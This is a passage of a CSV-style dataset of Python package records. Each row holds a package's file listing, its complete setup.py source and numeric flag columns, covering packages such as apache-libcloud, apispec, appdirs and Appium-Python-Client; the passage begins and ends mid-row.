            ""documentation""
        )
        sys.exit(1)


class ApiDocsCommand(Command):
    description = ""generate API documentation""
    user_options = []

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    def run(self):
        if not has_epydoc:
            raise RuntimeError('Missing ""epydoc"" package!')

        os.system(
            ""pydoctor""
            "" --add-package=libcloud""
            "" --project-name=libcloud""
            "" --make-html""
            ' --html-viewsource-base=""%s""'
            "" --project-base-dir=`pwd`""
            ' --project-url=""%s""' % (HTML_VIEWSOURCE_BASE, PROJECT_BASE_DIR)
        )


forbid_publish()

needs_pytest = {""pytest"", ""test"", ""ptr""}.intersection(sys.argv)
pytest_runner = [""pytest-runner""] if needs_pytest else []

setup(
    name=""apache-libcloud"",
    version=read_version_string(),
    description=""A standard Python library that abstracts away differences""
    + "" among multiple cloud provider APIs. For more information""
    + "" and documentation, please see https://libcloud.apache.org"",
    long_description=open(""README.rst"").read(),
    author=""Apache Software Foundation"",
    author_email=""dev@libcloud.apache.org"",
    install_requires=INSTALL_REQUIREMENTS,
    python_requires="">=3.6, <4"",
    packages=get_packages(""libcloud""),
    package_dir={
        ""libcloud"": ""libcloud"",
    },
    package_data={
        ""libcloud"": get_data_files(""libcloud"", parent=""libcloud"") + [""py.typed""],
    },
    license=""Apache License (2.0)"",
    url=""https://libcloud.apache.org/"",
    setup_requires=pytest_runner,
    tests_require=TEST_REQUIREMENTS,
    cmdclass={
        ""apidocs"": ApiDocsCommand,
    },
    zip_safe=False,
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Environment :: Console"",
        ""Intended Audience :: Developers"",
        ""Intended Audience :: System Administrators"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: Implementation :: CPython"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
    ],
)
",0
apache-sedona-1.2.0,0,1,1,1,1,0,1,0,dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO README.md file_data_splitter.py grid_type.py index_type.py join_build_side.py spatial.py __init__.py disc_utils.py geo_json_reader.py geo_reader.py shape_file_reader.py __init__.py wkb_reader.py wkt_reader.py __init__.py circle.py envelope.py __init__.py abstract.py config.py translate.py __init__.py join_params.py join_query.py join_query_raw.py knn_query.py range_query.py range_query_raw.py rdd.py __init__.py circle_rdd.py linestring_rdd.py point_rdd.py polygon_rdd.py rectangle_rdd.py spatial_rdd.py spatial_rdd_factory.py __init__.py utils.py __init__.py exceptions.py geo_registrator.py java_libs.py __init__.py exceptions.py types.py __init__.py abstract_parser.py adapter.py binary_parser.py decorators.py geometry_adapter.py jvm.py meta.py prep.py serde.py spatial_rdd_parser.py types.py __init__.py version.py __init__.py setup.cfg setup.py,"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at

#   http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.

from setuptools import setup, find_packages
from os import path
from sedona import version

here = path.abspath(path.dirname(__file__))

with open(""README.md"", ""r"") as fh:
    long_description = fh.read()

setup(
    name='apache-sedona',
    version=version,
    description='Apache Sedona is a cluster computing system for processing large-scale spatial data',
    url='https://sedona.apache.org',
    license=""Apache License v2.0"",
    author='Apache Sedona',
    author_email='dev@sedona.apache.org',
    packages=find_packages(exclude=[""*.tests"", ""*.tests.*"", ""tests.*"", ""tests""]),
    long_description=long_description,
    long_description_content_type=""text/markdown"",
    python_requires='>=3.6',
    install_requires=['attrs', ""shapely""],
    extras_require={""spark"": ['pyspark>=2.3.0']},
    project_urls={
        'Documentation': 'https://sedona.apache.org',
        'Source code': 'https://github.com/apache/incubator-sedona',
        'Bug Reports': 'https://issues.apache.org/jira/projects/SEDONA'
    },
    classifiers=[
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: Apache Software License""
    ]
)

",0
apiclient-1.0.4,0,1,1,1,1,0,1,0,base.py ratelimiter.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt CHANGES.rst LICENSE.txt MANIFEST.in PKG-INFO README README.rst setup.cfg setup.py,"#!/usr/bin/env python

import os

try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup

def path(p):
    return os.path.join(os.path.abspath(os.path.dirname(__file__)), p)

long_description = ''

try:
    long_description += open(path('README.rst')).read()
    long_description += '\n\n' + open(path('CHANGES.rst')).read()
except IOError:
    pass

version = '1.0.4'

requirements = [
    'urllib3',
    'certifi'
]
tests_requirements = requirements + [
    'nose',
]

setup(name='apiclient',
      version=version,
      description=""Framework for making good API client libraries using urllib3."",
      long_description=long_description,
      classifiers=[
          'Environment :: Web Environment',
          'Intended Audience :: Developers',
          'License :: OSI Approved :: MIT License',
          'Operating System :: OS Independent',
          'Programming Language :: Python',
          'Topic :: Internet :: WWW/HTTP',
          'Topic :: Software Development :: Libraries',
      ],
      keywords='api client urllib3 keepalive threadsafe http rest',
      author='Andrey Petrov',
      author_email='andrey.petrov@shazow.net',
      url='https://github.com/shazow/apiclient',
      license='MIT',
      packages=['apiclient'],
      install_requires=requirements,
      tests_require=tests_requirements,
      )
",0
apipkg-3.0.1,0,1,1,1,0,0,1,0,.gitignore LICENSE PKG-INFO pyproject.toml README.rst py.typed _alias_module.py _importing.py _module.py _syncronized.py _version.py __init__.py,,1
apispec-5.2.2,0,1,1,1,1,0,0,0,AUTHORS.rst CHANGELOG.rst CONTRIBUTING.rst api_core.rst api_ext.rst authors.rst changelog.rst conf.py contributing.rst ecosystem.rst index.rst install.rst license.rst make.bat Makefile quickstart.rst special_topics.rst upgrading.rst using_plugins.rst writing_plugins.rst LICENSE MANIFEST.in PKG-INFO pyproject.toml README.rst setup.cfg setup.py core.py exceptions.py common.py field_converter.py openapi.py schema_resolver.py __init__.py __init__.py plugin.py py.typed utils.py yaml_utils.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt conftest.py schemas.py test_core.py test_ext_marshmallow.py test_ext_marshmallow_common.py test_ext_marshmallow_field.py test_ext_marshmallow_openapi.py test_utils.py test_yaml_utils.py utils.py __init__.py,"import re
from setuptools import setup, find_packages

EXTRAS_REQUIRE = {
    ""marshmallow"": [""marshmallow>=3.13.0""],
    ""yaml"": [""PyYAML>=3.10""],
    ""validation"": [""prance[osv]>=0.11""],
    ""lint"": [
        ""flake8==4.0.1"",
        ""flake8-bugbear==22.4.25"",
        ""pre-commit~=2.4"",
        ""mypy==0.950"",
        ""types-PyYAML"",
    ],
    ""docs"": [
        ""marshmallow>=3.13.0"",
        ""pyyaml==6.0"",
        ""sphinx==4.5.0"",
        ""sphinx-issues==3.0.1"",
        ""sphinx-rtd-theme==1.0.0"",
    ],
}
EXTRAS_REQUIRE[""tests""] = (
    EXTRAS_REQUIRE[""yaml""]
    + EXTRAS_REQUIRE[""validation""]
    + [""marshmallow>=3.13.0"", ""pytest"", ""mock""]
)
EXTRAS_REQUIRE[""dev""] = EXTRAS_REQUIRE[""tests""] + EXTRAS_REQUIRE[""lint""] + [""tox""]


def find_version(fname):
    """"""Attempts to find the version number in the file names fname.
    Raises RuntimeError if not found.
    """"""
    version = """"
    with open(fname) as fp:
        reg = re.compile(r'__version__ = [\'""]([^\'""]*)[\'""]')
        for line in fp:
            m = reg.match(line)
            if m:
                version = m.group(1)
                break
    if not version:
        raise RuntimeError(""Cannot find version information."")
    return version


def read(fname):
    with open(fname) as fp:
        content = fp.read()
    return content


setup(
    name=""apispec"",
    version=find_version(""src/apispec/__init__.py""),
    description=""A pluggable API specification generator. Currently supports the ""
    ""OpenAPI Specification (f.k.a. the Swagger specification)."",
    long_description=read(""README.rst""),
    author=""Steven Loria"",
    author_email=""sloria1@gmail.com"",
    url=""https://github.com/marshmallow-code/apispec"",
    packages=find_packages(""src""),
    package_dir={"""": ""src""},
    include_package_data=True,
    extras_require=EXTRAS_REQUIRE,
    license=""MIT"",
    zip_safe=False,
    keywords=""apispec swagger openapi specification oas documentation spec rest api"",
    python_requires="">=3.7"",
    classifiers=[
        ""License :: OSI Approved :: MIT License"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.7"",
        ""Programming Language :: Python :: 3.8"",
        ""Programming Language :: Python :: 3.9"",
        ""Programming Language :: Python :: 3.10"",
        ""Programming Language :: Python :: 3 :: Only"",
    ],
    test_suite=""tests"",
    project_urls={
        ""Funding"": ""https://opencollective.com/marshmallow"",
        ""Issues"": ""https://github.com/marshmallow-code/apispec/issues"",
        ""Tidelift"": ""https://tidelift.com/subscription/pkg/pypi-apispec?utm_source=pypi-apispec&utm_medium=pypi"",  # noqa: B950,E501
    },
)
",1
apispec-webframeworks-0.5.2,0,1,1,1,1,0,0,0,PKG-INFO README.rst setup.cfg setup.py bottle.py flask.py test_ext_bottle.py test_ext_flask.py test_ext_tornado.py utils.py __init__.py tornado.py __init__.py dependency_links.txt not-zip-safe PKG-INFO requires.txt SOURCES.txt top_level.txt,"from setuptools import setup, find_packages

VERSION = ""0.5.2""
EXTRAS_REQUIRE = {
    ""tests"": [""pytest"", ""mock"", ""Flask==1.1.1"", ""tornado"", ""bottle==0.12.17""],
    ""lint"": [""flake8==3.7.9"", ""flake8-bugbear==19.8.0"", ""pre-commit~=1.18""],
}
EXTRAS_REQUIRE[""dev""] = EXTRAS_REQUIRE[""tests""] + EXTRAS_REQUIRE[""lint""] + [""tox""]


def read(fname):
    with open(fname) as fp:
        content = fp.read()
    return content


setup(
    name=""apispec-webframeworks"",
    version=VERSION,
    description=""Web framework plugins for apispec."",
    long_description=read(""README.rst""),
    author=""Steven Loria"",
    author_email=""sloria1@gmail.com"",
    url=""https://github.com/marshmallow-code/apispec-webframeworks"",
    packages=find_packages(""src""),
    package_dir={"""": ""src""},
    include_package_data=True,
    install_requires=[""apispec[yaml]>=2.0.0""],
    python_requires="">=3.6"",
    extras_require=EXTRAS_REQUIRE,
    license=""MIT"",
    zip_safe=False,
    keywords=(
        ""apispec"",
        ""swagger"",
        ""openapi"",
        ""specification"",
        ""documentation"",
        ""spec"",
        ""rest"",
        ""api"",
        ""web"",
        ""flask"",
        ""tornado"",
        ""bottle"",
        ""frameworks"",
    ),
    classifiers=[
        ""Development Status :: 4 - Beta"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: MIT License"",
        ""Natural Language :: English"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7"",
    ],
    test_suite=""tests"",
    project_urls={
        ""Funding"": ""https://opencollective.com/marshmallow"",
        ""Issues"": ""https://github.com/marshmallow-code/apispec-webframeworks/issues"",
    },
)
",1
aplus-0.11.0,0,1,0,1,0,0,1,0,__init__.py PKG-INFO setup.py,"# coding=utf-8
from distutils.core import setup

setup(
    name=""aplus"",
    version=""0.11.0"",
    packages=['aplus'],
    author=u""Michael M. Tiller"",
    author_email=""michael.tiller@gmail.com""
)
",1
apns2-0.7.2,0,1,1,0,1,0,0,0,client.py credentials.py errors.py payload.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py eckey.pem test_client.py test_credentials.py test_payload.py,"#!/usr/bin/env python

from setuptools import setup

setup(
    name='apns2',
    version='0.7.2',
    packages=['apns2'],
    install_requires=[
        'hyper>=0.7',
        'PyJWT>=1.4.0,<2.0.0',
        'cryptography>=1.7.2',
    ],
    extras_require={
        ""tests"": [
            'freezegun',
            'pytest',
        ],
    },
    url='https://github.com/Pr0Ger/PyAPNs2',
    license='MIT',
    author='Sergey Petrov',
    author_email='me@pr0ger.prg',
    classifiers=[
        'Development Status :: 4 - Beta',
        'License :: OSI Approved :: MIT License',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Topic :: Software Development :: Libraries',
    ],
    description='A python library for interacting with the Apple Push Notification Service via HTTP/2 protocol'
)
",0
appdirs-1.4.4,0,1,1,1,0,0,0,0,.gitignore .travis.yml dependency_links.txt PKG-INFO SOURCES.txt top_level.txt appdirs.py CHANGES.rst Dockerfile HACKING.md LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test_api.py __init__.py TODO.md tox.ini,"#!/usr/bin/env python
import sys
import os
import os.path
# appdirs is a dependency of setuptools, so allow installing without it.
try:
    from setuptools import setup
except ImportError:
    from distutils.core import setup
import ast

tests_require = []
if sys.version_info < (2, 7):
    tests_require.append(""unittest2"")


def read(fname):
    inf = open(os.path.join(os.path.dirname(__file__), fname))
    out = ""\n"" + inf.read().replace(""\r\n"", ""\n"")
    inf.close()
    return out


# Do not import `appdirs` yet, lest we import some random version on sys.path.
for line in read(""appdirs.py"").splitlines():
    if line.startswith(""__version__""):
        version = ast.literal_eval(line.split(""="", 1)[1].strip())
        break


setup(
    name='appdirs',
    version=version,
    description='A small Python module for determining appropriate ' + \
        'platform-specific dirs, e.g. a ""user data dir"".',
    long_description=read('README.rst') + '\n' + read('CHANGES.rst'),
    classifiers=[c.strip() for c in """"""
        Development Status :: 5 - Production/Stable
        Intended Audience :: Developers
        License :: OSI Approved :: MIT License
        Operating System :: OS Independent
        Programming Language :: Python :: 2
        Programming Language :: Python :: 2.7
        Programming Language :: Python :: 3
        Programming Language :: Python :: 3.4
        Programming Language :: Python :: 3.5
        Programming Language :: Python :: 3.6
        Programming Language :: Python :: 3.7
        Programming Language :: Python :: 3.8
        Programming Language :: Python :: Implementation :: PyPy
        Programming Language :: Python :: Implementation :: CPython
        Topic :: Software Development :: Libraries :: Python Modules
        """""".split('\n') if c.strip()],
    test_suite='test.test_api',
    tests_require=tests_require,
    keywords='application directory log cache user',
    author='Trent Mick',
    author_email='trentm@gmail.com',
    maintainer='Jeff Rouse',
    maintainer_email='jr@its.to',
    url='http://github.com/ActiveState/appdirs',
    license='MIT',
    py_modules=[""appdirs""],
)
",1
appier-1.29.1,0,1,1,1,0,0,0,0,MANIFEST.in PKG-INFO README.rst setup.cfg setup.py amqp.py api.py asgi.py asynchronous.py async_neo.py async_old.py base.py bus.py cache.py common.py component.py compress.py config.py controller.py crypt.py data.py defines.py exceptions.py execution.py export.py extra.py extra_neo.py extra_old.py geo.py git.py graph.py http.py legacy.py log.py meta.py mock.py model.py model_a.py mongo.py observer.py part.py preferences.py queuing.py redisdb.py request.py base.css favicon.ico base.js error.html.tpl holder.html.tpl layout.html.tpl scheduler.py serialize.py session.py settings.py smtp.py storage.py structures.py base.py cache.py config.py crypt.py data.py exceptions.py export.py graph.py http.py legacy.py log.py mock.py model.py part.py preferences.py queuing.py request.py serialize.py session.py smtp.py structures.py typesf.py util.py __init__.py typesf.py util.py validation.py __init__.py dependency_links.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt,"#!/usr/bin/python
# -*- coding: utf-8 -*-

# Hive Appier Framework
# Copyright (c) 2008-2022 Hive Solutions Lda.
#
# This file is part of Hive Appier Framework.
#
# Hive Appier Framework is free software: you can redistribute it and/or modify
# it under the terms of the Apache License as published by the Apache
# Foundation, either version 2.0 of the License, or (at your option) any
# later version.
#
# Hive Appier Framework is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# Apache License for more details.
#
# You should have received a copy of the Apache License along with
# Hive Appier Framework. If not, see <http://www.apache.org/licenses/>.

__author__ = ""João Magalhães <joamag@hive.pt>""
"""""" The author(s) of the module """"""

__version__ = ""1.0.0""
"""""" The version of the module """"""

__revision__ = ""$LastChangedRevision$""
"""""" The revision number of the module """"""

__date__ = ""$LastChangedDate$""
"""""" The last change date of the module """"""

__copyright__ = ""Copyright (c) 2008-2022 Hive Solutions Lda.""
"""""" The copyright for the module """"""

__license__ = ""Apache License, Version 2.0""
"""""" The license for the module """"""

import os
import setuptools

def read_file(path):
    if not os.path.exists(path): return None
    file = open(path, ""r"")
    try: return file.read()
    finally: file.close()

setuptools.setup(
    name = ""appier"",
    version = ""1.29.1"",
    author = ""Hive Solutions Lda."",
    author_email = ""development@hive.pt"",
    description = ""Appier Framework"",
    license = ""Apache License, Version 2.0"",
    keywords = ""appier framework web json wsgi"",
    url = ""http://appier.hive.pt"",
    zip_safe = False,
    packages = [
        ""appier"",
        ""appier.test""
    ],
    test_suite = ""appier.test"",
    package_dir = {
        """" : os.path.normpath(""src"")
    },
    package_data = {
        ""appier"" : [
            ""res/static/css/*"",
            ""res/static/images/*"",
            ""res/static/js/*"",
            ""res/templates/*""
        ]
    },
    classifiers = [
        ""Development Status :: 5 - Production/Stable"",
        ""Topic :: Utilities"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Operating System :: OS Independent"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2.6"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3.0"",
        ""Programming Language :: Python :: 3.1"",
        ""Programming Language :: Python :: 3.2"",
        ""Programming Language :: Python :: 3.3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: 3.7""
    ],
    long_description = read_file(""README.rst"")
)
",1
Appium-Python-Client-2.6.1,0,1,1,1,0,0,0,0,exceptions.py helper.py logger.py __init__.py adb_exec_timeout_option.py adb_port_option.py allow_delay_adb_option.py build_tools_version_option.py clear_device_logs_on_start_option.py ignore_hidden_api_policy_error_option.p logcat_filter_specs_option.py logcat_format_option.py mock_location_app_option.py remote_adb_host_option.py skip_logcat_capture_option.py suppress_kill_server_option.py __init__.py allow_test_packages_option.py android_install_timeout_option.py app_activity_option.py app_package_option.py app_wait_activity_option.py app_wait_duration_option.py app_wait_for_launch_option.py app_wait_package_option.py auto_grant_premissions_option.py enforce_app_install_option.py intent_action_option.py intent_category_option.py intent_flags_option.py optional_intent_arguments_option.py remote_apps_cache_limit_option.py uninstall_other_packages_option.py __init__.py avd_args_option.py avd_env_option.py avd_launch_timeout_option.py avd_option.py avd_ready_timeout_option.py gps_enabled_option.py network_speed_option.py __init__.py auto_webview_timeout_option.py chromedriver_args_option.py chromedriver_chrome_mapping_file_op chromedriver_disable_build_check_op chromedriver_executable_dir_option. chromedriver_executable_option.py chromedriver_ports_option.py chromedriver_port_option.py chromedriver_use_system_executable_ chrome_logging_prefs_option.py chrome_options_option.py ensure_webviews_have_pages_option.p extract_chrome_android_package_from native_web_screenshot_option.py recreate_chrome_driver_sessions_opt show_chromedriver_log_option.py webview_devtools_port_option.py __init__.py locale_script_option.py __init__.py skip_unlock_option.py unlock_key_option.py unlock_strategy_option.py unlock_success_timeout_option.py unlock_type_option.py __init__.py mjpeg_screenshot_url_option.py __init__.py disable_suppress_accessibility_servic user_profile_option.py __init__.py keystore_password_option.py keystore_path_option.py key_alias_option.py key_password_option.py no_sign_option.py use_keystore_option.py __init__.py __init__.py activity_options_option.py app_locale_option.py base.py espresso_build_config_option.py espresso_server_launch_timeout_option.py force_espresso_rebuild_option.py intent_options_option.py show_gradle_log_option.py __init__.py base.py disable_window_animation_option.py mjpeg_server_port_option.py skip_device_initialization_option.py skip_server_installation_option.py uiautomator2_server_install_timeout_o uiautomator2_server_launch_timeout_op uiautomator2_server_read_timeout_opti __init__.py __init__.py app_option.py automation_name_option.py auto_web_view_option.py base.py bundle_id_option.py clear_system_files_option.py device_name_option.py enable_performance_logging_option.py event_timings_option.py full_reset_option.py is_headless_option.py language_option.py locale_option.py new_command_timeout_option.py no_reset_option.py orientation_option.py other_apps_option.py postrun_option.py prerun_option.py print_page_source_on_find_failure_option.py skip_log_capture_option.py supports_capabilities.py system_host_option.py system_port_option.py udid_option.py __init__.py android_storage_option.py base.py firefox_options_option.py marionette_port_option.py verbosity_option.py __init__.py automatic_inspection_option.py automatic_profiling_option.py base.py device_name_option.py device_type_option.py device_udid_option.py platform_build_version_option.py platform_version_option.py use_simulator_option.py webkit_webrtc_option.py __init__.py app_install_strategy_option.py app_push_timeout_option.py localizable_strings_dir_option.py __init__.py base.py include_device_caps_to_session_info_o reset_location_service_option.py __init__.py command_timeouts_option.py launch_with_idb_option.py show_ios_log_option.py use_json_source_option.py __init__.py calendar_access_authorized_option.p calendar_format_option.py connect_hardware_keyboard_option.py custom_ssl_cert_option.py enforce_fresh_simulator_creation_op force_simulator_software_keyboard_p ios_simulator_logs_predicate_option keep_key_chains_option.py keychains_exclude_patterns_option.p permissions_option.py reduce_motion_option.py reset_on_session_start_only_option. scale_factor_option.py shutdown_other_simulators_option.py simulator_devices_set_path_option.p simulator_pasteboard_automatic_sync simulator_startup_timeout_option.py simulator_trace_pointer_option.py simulator_window_center_option.py __init__.py allow_provisioning_device_regitration_opt auto_accept_alerts_option.py auto_disimiss_alerts_option.py derived_data_path_option.py disable_automatic_screenshots_option.py force_app_launch_option.py keychain_password_option.py keychain_path_option.py max_typing_frequency_option.py mjpeg_server_port_option.py process_arguments_option.py result_bundle_path_option.py screenshot_quality_option.py should_terminate_app_option.py should_use_singleton_test_manager_option. show_xcode_log_option.py simple_is_visible_check_option.py updated_wda_bundle_id_option.py use_native_caching_strategy_option.py use_new_wda_option.py use_prebuilt_wda_option.py use_simple_build_test_option.py use_xctestrun_file_option.py wait_for_idle_timeout_option.py wait_for_quiescence_option.py wda_base_url_option.py wda_connection_timeout_option.py wda_eventloop_idle_delay_option.py wda_launch_timeout_option.py wda_local_port_option.py wda_startup_retries_option.py wda_startup_retry_interval_option.py web_driver_agent_url_option.py xcode_org_id_option.py xcode_signing_id_option.py __init__.py absolute_web_locations_option.py additional_webview_bundle_ids_option. enable_async_execute_from_https_optio full_context_list_option.py include_safari_in_webviews_option.py native_web_tap_option.py safari_garbage_collect_option.py safari_ignore_fraud_warning_option.py safari_ignore_web_hostnames_option.py safari_initial_url_option.py safari_log_all_communication_hex_dump safari_log_all_communication_option.p safari_open_links_in_background_optio safari_socket_chunk_size_option.py safari_web_inspector_max_frame_length webkit_response_timeout_option.py webview_connect_retries_option.py webview_connect_timeout_option.py __init__.py __init__.py __init__.py arguments_option.py base.py bootstrap_root_option.py environment_option.py server_startup_timeout_option.py show_server_logs_option.py skip_app_kill_option.py web_driver_agent_mac_url_option.py __init__.py __init__.py app_top_level_window_option.py app_working_dir_option.py base.py create_session_timeout_option.py expreimental_web_driver_option.py wait_for_app_launch_option.py __init__.py __init__.py __init__.py protocol.py can_execute_commands.py can_execute_scripts.py can_find_elements.py __init__.py __init__.py py.typed version.py appium_connection.py appium_service.py applicationstate.py clipboard_content_type.py command_method.py appiumby.py mobileby.py multi_action.py touch_action.py __init__.py connectiontype.py errorhandler.py action_helpers.py activities.py common.py display.py gsm.py nativekey.py network.py performance.py power.py sms.py system_bars.py __init__.py applications.py clipboard.py context.py device_time.py execute_driver.py execute_mobile_command.py hw_actions.py images_comparison.py ime.py keyboard.py location.py log_event.py remote_fs.py screen_record.py session.py settings.py __init__.py mobilecommand.py switch_to.py webdriver.py webelement.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt .DS_Store appium.common.rst appium.rst appium.webdriver.common.rst appium.webdriver.extensions.android.rst appium.webdriver.extensions.rst appium.webdriver.extensions.search_context.rst appium.webdriver.rst conf.py generate.sh index.rst make.bat Makefile README.md requirements.txt webdriver.common.rst webdriver.extensions.android.rst webdriver.extensions.rst webdriver.extensions.search_context.rst webdriver.rst appium.common.doctree appium.doctree appium.webdriver.common.doctree appium.webdriver.doctree appium.webdriver.extensions.android.doctree appium.webdriver.extensions.doctree appium.webdriver.extensions.search_context.doctree environment.pickle index.doctree .buildinfo .nojekyll appium.common.html appium.html appium.webdriver.common.html appium.webdriver.extensions.android.html appium.webdriver.extensions.html appium.webdriver.extensions.search_context.html appium.webdriver.html genindex.html index.html objects.inv py-modindex.html search.html searchindex.js appium.common.rst.txt appium.rst.txt appium.webdriver.common.rst.txt appium.webdriver.extensions.android.rst.txt appium.webdriver.extensions.rst.txt appium.webdriver.extensions.search_context.rst. appium.webdriver.rst.txt index.rst.txt basic.css badge_only.css fontawesome-webfont.eot fontawesome-webfont.svg fontawesome-webfont.ttf fontawesome-webfont.woff fontawesome-webfont.woff2 lato-bold-italic.woff lato-bold-italic.woff2 lato-bold.woff lato-bold.woff2 lato-normal-italic.woff lato-normal-italic.woff2 lato-normal.woff lato-normal.woff2 Roboto-Slab-Bold.woff Roboto-Slab-Bold.woff2 Roboto-Slab-Regular.woff Roboto-Slab-Regular.woff2 theme.css doctools.js documentation_options.js file.png jquery-3.5.1.js jquery.js badge_only.js html5shiv-printshiv.min.js html5shiv.min.js theme.js language_data.js minus.png plus.png pygments.css searchtools.js underscore-1.13.1.js underscore.js LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"#!/usr/bin/env python

# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
import io
import os

from setuptools import find_packages, setup

from appium.common.helper import library_version

setup(
    name='Appium-Python-Client',
    version=library_version(),
    description='Python client for Appium',
    long_description=io.open(os.path.join(os.path.dirname('__file__'), 'README.md'), encoding='utf-8').read(),
    long_description_content_type='text/markdown',
    keywords=['appium', 'selenium', 'selenium 4', 'python client', 'mobile automation'],
    author='Isaac Murchie',
    author_email='isaac@saucelabs.com',
    maintainer='Kazuaki Matsuo, Mykola Mokhnach, Mori Atsushi',
    url='http://appium.io/',
    package_data={'appium': ['py.typed']},
    packages=find_packages(include=['appium*']),
    license='Apache 2.0',
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Programming Language :: Python',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Environment :: Console',
        'Environment :: MacOS X',
        'Environment :: Win32 (MS Windows)',
        'Intended Audience :: Developers',
        'Intended Audience :: Other Audience',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: OS Independent',
        'Topic :: Software Development :: Quality Assurance',
        'Topic :: Software Development :: Testing',
    ],
    install_requires=['selenium ~= 4.1'],
)
",0
AppKit-0.2.8,1,1,1,1,0,0,0,0,app.py quickstart.py ui.html routing.py test_app.py __init__.py v0_2_6.py v0_2_8.py v0_2_8.pyc __init__.py __init__.pyc app.py app.pyc test_app.py __init__.py __init__.pyc dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
import os


data = list()
for d in os.walk('appkit/'):
    if len(d[2]) > 0:
        path_list = [str.join('/', os.path.join(d[0], x).split('/')[1:]) for x in d[2]]
        data.extend(path_list)

requires = ['flask', 'pygobject',]
requires.append('beautifulsoup4')  # v0_2_4 backward compatibility

setup(
    name='AppKit',
    version='0.2.8',
    description='Desktop application framework based on Webkit' +
    ' HTML5, CSS3, Javascript and Python',
    author='Nitipit Nontasuwan',
    author_email='nitipit@gmail.com',
    url='http://nitipit.github.com/appkit/',
    license='MIT',
    platforms=['Linux', ],
    keywords=['framework, html5, gnome, ui'],
    package_dir={'appkit': 'appkit'},
    packages=['appkit'],
    package_data={'appkit': data},
    install_requires=requires,
)
",0
applicationinsights-0.11.10,0,1,1,1,1,0,0,0,AsynchronousQueue.py AsynchronousSender.py Application.py AvailabilityData.py Base.py Cloud.py Data.py DataPoint.py DataPointType.py Device.py Domain.py Envelope.py EventData.py ExceptionData.py ExceptionDetails.py Internal.py Location.py MessageData.py MetricData.py Operation.py PageViewData.py PageViewPerfData.py RemoteDependencyData.py RequestData.py Session.py SeverityLevel.py StackFrame.py User.py Utils.py __init__.py NullSender.py QueueBase.py SenderBase.py SynchronousQueue.py SynchronousSender.py TelemetryChannel.py TelemetryContext.py __init__.py common.py logging.py middleware.py __init__.py enable.py __init__.py ext.py __init__.py LoggingHandler.py __init__.py WSGIApplication.py __init__.py TelemetryClient.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt CHANGELOG.md CONTRIBUTING.md LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py TestApplication.py TestData.py TestDataPoint.py TestDevice.py TestEnvelope.py TestEventData.py TestExceptionData.py TestExceptionDetails.py TestInternal.py TestLocation.py TestMessageData.py TestMetricData.py TestOperation.py TestPageViewData.py TestRemoteDependencyData.py TestRequestData.py TestSession.py TestStackFrame.py TestUser.py Utils.py __init__.py TestAsynchronousQueue.py TestAsynchronousSender.py TestQueueBase.py TestSenderBase.py TestSynchronousQueue.py TestSynchronousSender.py TestTelemetryChannel.py TestTelemetryContext.py __init__.py TestEnable.py __init__.py TestLoggingHandler.py __init__.py TestWSGIApplication.py __init__.py TestTelemetryClient.py TestTelemetryProcessor.py __init__.py __init__.py,"from setuptools import setup, find_packages  # Always prefer 